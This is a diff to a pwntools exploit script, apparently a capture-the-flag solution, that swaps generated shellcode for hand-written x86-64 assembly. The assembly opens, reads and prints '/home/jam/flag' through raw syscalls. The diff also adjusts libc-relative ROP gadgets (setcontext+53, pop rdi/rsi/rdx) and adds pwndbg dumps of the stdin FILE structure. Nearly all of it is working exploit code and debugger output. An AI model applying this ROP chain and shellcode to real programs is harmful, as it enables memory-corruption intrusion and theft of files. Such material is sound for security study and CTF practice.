@@ -46,17 +46,49 @@ add('KJM\x00',pay)
 add('a'*4,'X'*8)
 
 # Shellcode
+'''
 shellcode = ''
 shellcode += 'sub rsp, 0x108'
 shellcode += shellcraft.open("/home/jam/flag")
 shellcode += shellcraft.read("rax",'rsp',100)
 shellcode += shellcraft.write(1,'rsp',100)
+'''
+
+shellcode = asm('''
+      add rsp,0x500
+      mov rax, 0x000067616c662f6d
+      push rax
+      mov rax, 0x616a2f656d6f682f
+      push rax
+      
+        
+      mov rdi,rsp
+      mov rsi,0
+      mov rdx,0
+
+      mov rax,2
+      syscall
+
+      mov rdi,rax
+      mov rsi,rsp
+      mov rdx,0x100
+
+      mov rax,0
+      syscall
+
+      mov rdi,1
+      mov rsi,rsp
+      mov rdx,0x100
+
+      mov rax,1
+      syscall
+''')
 
 
 # ROPgadget
 setcontext_53 = libc_base + 293765
 syscall = libc_base + 1030932
-ret = libc_base + 0x0000000000000937
+ret = libc_base + 0x00000000000937
 pop_rdi = libc_base + 0x0000000000021112
 pop_rsi = libc_base + 0x00000000000202f8
 pop_rdx = libc_base + 0x0000000000001b92
@@ -78,7 +110,8 @@ rop += p64(syscall)
 rop += 'X'*8					# dummy
 rop += p64(libc_base+3951328)  	# shellcode addr
 rop += p64(0)
-rop += asm(shellcode)
+rop += shellcode
+
 
 # RSP control
 pay = ''
@@ -120,4 +153,21 @@ p.interactive()
    0x7ffff7a54bcd:	xor    eax,eax
    0x7ffff7a54bcf:	ret    
 
+'''
+
+
+'''
+0x7ffff7dd1980 <_IO_2_1_stdin_+160>:	0x00007ffff7dd19c0	0x0000000000000000
+0x7ffff7dd1990 <_IO_2_1_stdin_+176>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd19a0 <_IO_2_1_stdin_+192>:	0x00000000ffffffff	0x0000000000000000
+0x7ffff7dd19b0 <_IO_2_1_stdin_+208>:	0x0000000000000000	0x00007ffff7dd06e0
+0x7ffff7dd19c0 <_IO_wide_data_0>:	0x0000000000000000	0x0000000000000000
+pwndbg> 
+0x7ffff7dd19d0 <_IO_wide_data_0+16>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd19e0 <_IO_wide_data_0+32>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd19f0 <_IO_wide_data_0+48>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd1a00 <_IO_wide_data_0+64>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd1a10 <_IO_wide_data_0+80>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd1a20 <_IO_wide_data_0+96>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd1a30 <_IO_wide_data_0+112>:	0x0000000000000000	0x0000000000000000
 '''
